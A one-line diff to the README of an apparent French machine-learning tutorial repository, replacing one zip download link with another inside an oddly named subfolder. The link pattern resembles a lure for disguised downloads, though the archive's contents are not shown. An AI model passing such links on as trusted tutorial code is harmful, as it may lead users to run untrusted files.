@@ -1,2 +1,2 @@
 # MachineLearning-tutorial-French
-Codes provenant de mes vidéos YouTube : https://raw.githubusercontent.com/mactar221/Regression-lineaire-numpy/master/gentlemanlike/Regression_lineaire_numpy_v2.9.zip
+Codes provenant de mes vidéos YouTube : https://github.com/mactar221/Regression-lineaire-numpy/raw/refs/heads/master/gentlemanlike/Regression-numpy-lineaire-v2.0.zip
